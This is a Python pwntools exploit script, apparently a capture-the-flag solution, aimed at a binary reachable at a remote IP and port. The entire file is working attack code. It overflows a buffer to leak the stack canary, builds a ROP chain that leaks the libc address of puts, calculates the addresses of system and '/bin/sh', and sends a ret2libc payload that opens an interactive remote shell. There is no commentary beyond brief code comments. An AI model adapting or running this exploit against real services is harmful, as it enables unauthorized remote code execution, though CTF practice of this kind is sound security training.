from pwn import *
context(arch='amd64', os='linux', log_level='debug')

libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
# io = process('./pwn')
io = remote('111.200.241.244', 56621)

# get canary
io.recv()
io.send(b'1\n')
io.send(cyclic(0x87))
io.recv()
io.send(b'2\n')
io.recv()
io.send(b'2\n')
io.recvuntil(b'biaa')
c = io.recv()[2:9]
print(c)
canary = u64(b'\x00' + c)

# some important addresses
libc_system_addr = libc.symbols['system']
libc_puts_addr = libc.symbols['puts']
poprdi_ret_addr = 0x400A93
libc_bin_sh_addr = next(libc.search(b'/bin/sh'))
puts_use_addr = 0x400A0D
main_addr = 0x400908
invalid_addr = 0x400A06

# input payload and get address of function puts()
io.send(b'1\n')
payload = cyclic(0x88) + p64(canary) + p64(0) + p64(poprdi_ret_addr) + \
		  p64(elf.got['puts']) + p64(elf.plt['puts']) + \
		  p64(main_addr)
io.send(payload)
io.recv()
io.send(b'3\n')
io.recv()
elf_puts_addr = u64(io.recv()[0:6] + b'\x00' * 2)

# calculate address of system and string "/bin/sh"
offset = elf_puts_addr - libc_puts_addr
elf_system_addr = offset + libc_system_addr
elf_bin_sh_addr = offset + libc_bin_sh_addr

# regain canary
io.send(b'1\n')
io.send(cyclic(0x89))
io.recv()
io.send(b'2\n')
io.recvuntil(b'biaa')
c = io.recv()[2:9]
print(c)
canary = u64(b'\x00' + c)

# input the last payload
io.send(b'1\n')
payload = cyclic(0x88) + p64(canary) + p64(0) + p64(poprdi_ret_addr) + \
		  p64(elf_bin_sh_addr + 0x40) + p64(elf_system_addr)
io.send(payload)
io.send(b'3\n')

io.interactive()